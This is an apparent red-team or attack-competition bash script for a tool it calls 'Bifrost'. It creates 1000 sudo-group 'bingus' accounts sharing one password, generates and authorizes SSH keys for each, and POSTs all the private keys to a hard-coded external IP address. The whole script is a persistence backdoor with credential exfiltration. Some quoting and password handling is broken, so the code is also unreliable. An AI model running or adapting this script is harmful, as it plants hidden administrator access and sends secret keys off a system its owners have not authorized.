#!/bin/bash
#
# Script that creates 1000 bingus users,
# and then generates ssh keypairs for each user,
# adding the public key to the authorized_keys file,
# and then sending back all the private keys to Bifrost
#
declare -A ssh_keys

for i in {1..1000}
do
  sudo useradd -m -d /home/bingus$i -p bingus bingus$i -G sudo > /dev/null 2>&1
  sudo mkdir /home/bingus$i/.ssh > /dev/null 2>&1 
  sudo ssh-keygen -t rsa -N "" -f /home/bingus$i/.ssh/id_rsa > /dev/null 2>&1 
  sudo cat /home/bingus$i/.ssh/id_rsa.pub | sudo tee -a /home/bingus$i/.ssh/authorized_keys > /dev/null 2>&1
  ssh_keys['bingus$i']=$(sudo cat /home/bingus$i/.ssh/id_rsa)
done

curl -XPOST -d '{"agent_id": 1, "ssh_keys": "$ssh_keys"}' 'http://129.21.100.59:5000/api/1.1/ssh_keys'
echo "Script done! :D"
